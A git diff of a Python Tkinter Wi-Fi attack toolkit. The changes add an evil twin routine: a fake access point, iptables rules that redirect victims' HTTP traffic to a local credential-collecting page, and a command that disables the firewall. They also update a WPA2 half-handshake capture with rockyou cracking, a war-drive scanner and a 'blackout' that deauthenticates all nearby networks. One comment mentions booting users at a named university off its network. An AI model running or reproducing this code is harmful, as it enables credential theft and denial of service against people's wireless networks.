@@ -110,7 +110,9 @@ class prog_nkb:
 ####################################################################################
 
 	def todays_news(self):
-		return 0
+		global working_directory
+		command1='xterm -hold -e \'python3 '+working_directory+'/W3BS_py3.py\''
+		os.system(command1)
 		#os.system("sudo -u deusxmachina xterm -hold -e 'play response.mp3'")
 		#sudo -u deusxmachina terminator -e "whoami && ping 1.1.1.1 -c 10 && play response.mp3"
 
@@ -219,7 +221,7 @@ class prog_nkb:
 				telf.option1 = Button(naster, text="WEP", font=("Courier"), command=telf.wep_hack)
 				telf.option1.pack()
 
-				telf.option2 = Button(naster, text="Evil Twin (< WPA2 CCMP)", command=telf.wpa2_hack)
+				telf.option2 = Button(naster, text="Half-Handshake Attack\n(< WPA2 CCMP)", command=telf.wpa2_hack)
 				telf.option2.pack()
 
 				telf.option3 = Button(naster, text="WAR DRIVE\n(nested network mass scanner)", command=telf.war_drive)
@@ -227,6 +229,9 @@ class prog_nkb:
 
 				telf.option4 = Button(naster, text="BLACK OUT\n(cut all wireless coms)", command=telf.blackout)
 				telf.option4.pack()
+
+				telf.option5 = Button(naster, text="Evil Twin Attack\n(-sslstrip, only http)", command=telf.eviltwin)
+				telf.option5.pack()
 
 			####################################################################################
 			#################################################################################### [ APPROVED* ]
@@ -253,7 +258,7 @@ class prog_nkb:
 				print('----------------------')
 				print('[1] ARP replay attack')
 				print('[2] Fragment Attack')
-				print('[3] Evil twin attack (discontinued)')
+				#print('[3] Evil twin attack (discontinued)')
 				print('----------------------')
 				wep_hack_input = int(input('[*] attack vector/# : '))
 				if wep_hack_input == 1: # arp attack
@@ -264,30 +269,33 @@ class prog_nkb:
 					print('[+] And crack using # aircrack-ng '+chosen_essid+' ... .cap')
 				elif wep_hack_input == 2:
 					pass
+				elif wep_hack_input == 3:
+					pass
 
 				os.system('rm -rf '+dump_file) ; os.system('airmon-ng stop '+we_netcard) ; os.system('systemctl restart NetworkManager')
 				print('---code finished---')
 
 			####################################################################################
 			#################################################################################### [ NOT APPROVED ! ]
-			#################################################################################### fix the giant sharp line below
+			#################################################################################### automate all the print() orders in the end section
 
-			def wpa2_hack(self):
+			def wpa2_hack(self): # HALF HANDSHAKE ATTACK
 				global working_directory
 				dump_file = './4.delete'
 				print('\n[+] Detecting available network cards...')
 				time.sleep(0.5) ; os.system('iwconfig | grep wlan') ; k = 0
 				while k==0:
 					try:
-						netcard = input('[*] monitor-mode capable AP\n(advised to use external card) : ')
+						netcard = input('[*] monitor-mode capable AP\n(advised to use INTERNAL card) : ')
 						if (a := os.system('iwconfig '+netcard)) == 0: # os.system() return value is 0 when no errors occured
 							k=1
-						else: print('[-] Error, invalid AP/network card')
+						else: print('[-] Error, invalid AP/network card') 
 					except:
 						print('[-] Error, invalid AP/network card')
 
 				print('\n')
 				os.system('ifconfig '+netcard+' up && airmon-ng start '+netcard) # +' && airmon-ng check kill')
+				netcard=netcard+"mon" # COMMENT OUT ON CIRCUMSTANCE
 				#####################
 				timeoutSeconds = 5 # seconds
 				#####################
@@ -348,13 +356,26 @@ class prog_nkb:
 													except:
 														ap_essid_final = ap_essid[0:10]
 				# start fake ap on same channel and essid
+				passw = 'zero.0pp3rCENT' #### doesn't really matter what password it is
 				os.system('iwconfig')
 				internet_ap = input('\n[*] network card with access to internet : ')
 				os.system('ifconfig '+internet_ap+' up')
-				passw = '12345678' ###################################################################################################################################### LEARN HOW TO SAVE ATTEMPTS IN DATABASE OR SOMETHING
-				command3 = working_directory+"/create_ap/create_ap "+netcard+" "+internet_ap+" \'"+ap_essid_final+"\' "+passw
+				command3 = "xterm -hold -e "+working_directory+"/create_ap/create_ap "+netcard+" "+internet_ap+" \'"+ap_essid_final+"\' "+passw+" &"
 				os.system(command3)
+				print('\n[+] Started fake ap')
+				# chose monitor mode enabled network card here!
+				print('[+] Start wireshark, use the following filter :\neapol && (wlan.ta==b0:a4:60:fb:c8:a0 || wlan.da==b0:a4:60:fb:c8:a0)\n(where b0:a4:60:fb:c8:a0 is my device mac addr)\nand then save as a .pcap file')
+				print('[*] Optional: start aireplay-ng --deauth 0 -a '+ap_mac_bssid+' wlan2')
+				print('[+] Finally, #aircrack-ng -w /usr/share/wordlists/rockyou.txt ./test.pcap') # DONE!
 
+				# touch del.pcap && tshark -i wlan0mon -w del.pcap -a duration:60 && aircrack-ng -w /usr/share/wordlists/rockyou.txt ./del.pcap
+
+				# start Tshark (cli wireshark) with eapol filter, apt install tshark
+				'''
+				filter = "" ; write_file = "hh_attack"
+				command4 = "tshark --color -i "+netcard+" -f "+filter+" -w "+write_file+" -c 1000"
+				os.system(command4)
+				'''
 
 				#command3 = "xterm -hold -e airbase-ng -e \'"+ap_essid_final+"\' -c "+ap_channel+" "+netcard+" &"
 				#os.system(command3)
@@ -393,7 +414,7 @@ class prog_nkb:
 			#################################################################################### [ NOT APPROVED ]
 			####################################################################################
 
-			def war_drive(self): # current use is for jacobs university, booting off network
+			def war_drive(self): # mass nest network surveillance / control
 				dump_file = './4.delete'
 				print('\n[+] Detecting available network cards...')
 				time.sleep(0.5) ; os.system('iwconfig | grep wlan') ; k = 0
@@ -407,7 +428,12 @@ class prog_nkb:
 						print('[-] Error, invalid AP/network card')
 
 				os.system('ifconfig '+netcard+' up && airmon-ng start '+netcard+' && airmon-ng check kill')
-				# netcard = netcard+'mon' BECAUSE WE ARE USING WLAN1
+				if netcard == "wlan0":
+					netcard=netcard+'mon'
+				#elif netcard == 'wlan1':
+				#	netcard=netcard+'mon'
+				else:
+					netcard=netcard #BECAUSE WE ARE USING WLAN1
 				
 				#===================#			
 				timeoutSeconds = 50*60 # seconds
@@ -417,7 +443,7 @@ class prog_nkb:
 				os.system('rm -rf '+dump_file)
 				print('[+] Scanning APs...('+str(timeoutSeconds)+'s)')
 				#os.system('rm -rf ./4.delete*')
-				command1 = 'airodump-ng '+netcard+' 2>&1 | tee '+dump_file
+				command1 = 'airodump-ng '+netcard+' --encrypt wep 2>&1 | tee '+dump_file
 				try:
 					subprocess.check_output(command1, shell=True, timeout=timeoutSeconds) # save APs to local file
 				except:
@@ -463,6 +489,7 @@ class prog_nkb:
 				input('Press enter to exit WAR DRIVE')
 
 				os.system('airmon-ng stop '+netcard) ; os.system('systemctl restart NetworkManager')
+				os.system('rm -rf /home/deusxmachina/4.delete')
 				print('---code finished---')
 				''' j_hacks()
 				os.system('ifconfig wlan1 up')
@@ -499,12 +526,18 @@ class prog_nkb:
 						print('[-] Error, invalid AP/network card')
 
 				# start airmon-ng
-				os.system('ifconfig '+netcard+' up && airmon-ng start '+netcard+' && airmon-ng check kill')
-				netcard=netcard+"mon" # COMMENT OUT THIS IF YOU UARE USING EXTERNAL NETWORK CARD
+				if netcard == "wlan0mon":
+					print('pass')
+				else:
+					os.system('ifconfig '+netcard+' up && airmon-ng start '+netcard+' && airmon-ng check kill')
+				if netcard == "wlan0":
+					netcard=netcard+"mon"
+				else:
+					netcard=netcard # for external cards
 
 				# scan target AP(s)
 				#####################
-				timeoutSeconds = 5 # seconds
+				timeoutSeconds = 30 # seconds
 				#####################
 				print('[+] Scanning APs...('+str(timeoutSeconds)+'s)')
 				lines = []
@@ -538,7 +571,9 @@ class prog_nkb:
 				os.system('sort '+kys_file+' | uniq > '+result_file)
 
 				# execute blackout
+				print('iwconfig '+netcard+' channel '+channel_num)
 				os.system('iwconfig '+netcard+' channel '+channel_num)
+				os.system('sleep 2s')
 				f = open(result_file, 'r')
 				for l in f:
 					l = l.rstrip()
@@ -547,31 +582,78 @@ class prog_nkb:
 					os.system(command3)
 
 				input("\n[*] Press enter to quit program")
-				'''
-				for j in range(int(target_num)):
-					while True:
-						choose_ap = input('\n[*] choose line/AP #%d : ' % j)
-						if sanitize_input('int', choose_ap) == 'success':
-							if int(choose_ap) <= len(lines):
-								chosen_ap = str(lines[int(choose_ap)])
-								ap_mac_bssid = chosen_ap[1:18]
-								ap_channel = chosen_ap[49:50]
-								ap_essid = chosen_ap[75:-1]
-								break
-							else:
-								print('[-] Error, please retry')
-						else:
-							print('[-] Error, please retry')
-					targets.append(ap_mac_bssid) ; targets.append(ap_channel) ; targets.append(ap_essid)
-				'''
 				os.system('airmon-ng stop '+netcard) ; os.system('rm -rf '+dump_file+' && rm -rf '+kys_file+' && rm -rf '+result_file+' && rm -rf '+result_final_file+' && systemctl restart NetworkManager')
 				print('---code finished---')
+
+			####################################################################################
+			#################################################################################### [on-development 2022.03.07]
+			####################################################################################
+
+			def eviltwin(self):
+				global working_directory
+				savefile = "./6.delete"
+				print('[*] What this program will automate (instructions) : ')
+				print('====== 0. Begin with external wifi card unplugged! This is so that it can grab the name \'wlan0\' \
+					 once the original wlan0 changes to wlan0mon')
+				print('====== 1. Turn internal wifi card to monitor mode ======')
+				os.system('iwconfig')
+				eviltwin_fakeAP = input("[+] Select internal wifi card : ")
+				os.system('ifconfig '+eviltwin_fakeAP+' up && airmon-ng start '+eviltwin_fakeAP)
+				eviltwin_fakeAP = eviltwin_fakeAP+'mon'
+				print('====== 2. Connect external wifi adapter NOW!')
+				input('[*] Once you see it in ifconfig as wlan0 you can press enter to continue')
+				os.system('ifconfig wlan0 up')
+				print('====== 3. Choose target AP')
+				chosen_ap  = pick_ap(eviltwin_fakeAP, savefile) # retrieve ap chosen from a line number
+				ap_mac_bssid = chosen_ap[0]
+				ap_channel = chosen_ap[1]
+				ap_essid = chosen_ap[2][0:-4] # grab until the End of Line symbol "[\xb01"
+				ap_essid = ap_essid[0:31] # max essid length is 32 characters
+				
+				print('====== 4. CONFIGURING hostapd.conf and dnsmasq.conf')
+				os.system('cp '+working_directory+'/eviltwin2022/hostapd.conf ./hostapd.conf.sample') # copy hostapd.conf to local directory, current directory is /home/deusxmachina
+				os.system('cp '+working_directory+'/eviltwin2022/dnsmasq.conf ./dnsmasq.conf') # copy dnsmasq.conf to local directory
+				os.system('sed s/sampleWifiAP/\''+ap_essid+'\'/g ./hostapd.conf.sample > hostapd.conf.1') # replace essid from sample to currently chosen one
+				os.system('sed s/channel=11/channel='+ap_channel+'/g hostapd.conf.1 > hostapd.conf') # replace default channel to currently chosen ap channel
+				'''
+				sed : 
+				-s : search
+				-g : global (all matches)
+				'''
+				print('[*] MAKE SURE db credentials match /var/www/html/dbconnect.php!!!!')
+				print('====== 5. ROUTING & NETWORK settings')
+				os.system('ifconfig '+eviltwin_fakeAP+' up 10.10.0.1 netmask 255.255.255.0') # set IP to fake AP 
+				os.system('route add -net 10.10.0.0 netmask 255.255.255.0 gw 10.10.0.1') # default gateway settings
+				os.system('bash '+working_directory+'/eviltwin2022/iptables.sh') # packet routing
+				''' iptables.sh 
+				iptables --flush
+				iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE 
+				iptables --append FORWARD --in-interface wlan0mon -j ACCEPT 
+				iptables -t nat -A POSTROUTING -j MASQUERADE
+				iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.10.0.1:80
+				#iptables -t nat -A OUTPUT -j DNAT --to-destination 127.0.0.1
+				echo 1 > /proc/sys/net/ipv4/ip_forward
+				'''
+				command1='xterm -hold -e \'hostapd hostapd.conf\' &'
+				command2='xterm -hold -e \'dnsmasq -C dnsmasq.conf -d\' &'
+				os.system(command1) # start hostapd (fakeAP)
+				os.system(command2) # start dnsmasq (DHCP & DNS)
+				os.system('systemctl start apache2 && systemctl start mariadb && ufw disable') # disable firewall and start web server and db server
+				input("\n[*] AFTER UNPLUGGING EXTERNAL WIFI CARD, Press enter to quit program")
+				os.system('airmon-ng stop '+eviltwin_fakeAP) ; os.system('rm -rf '+savefile+' && iptables --flush && iptables -t nat --flush && systemctl restart NetworkManager')
+				os.system('rm -rf ./hostapd.conf*')
+				os.system('rm -rf ./dnsmasq.conf*')
+				print('---code finished---')
+
+			####################################################################################
+			####################################################################################
+			####################################################################################
 
 		wifi_hack = Tk()
 		wifi_hack_gui = wifi_hack_framework(wifi_hack)
 		
 		w = 220
-		h = 180
+		h = 240
 		ws = nkb.winfo_screenwidth()
 		hs = nkb.winfo_screenheight()
 		x = (ws/2) - (w/2)
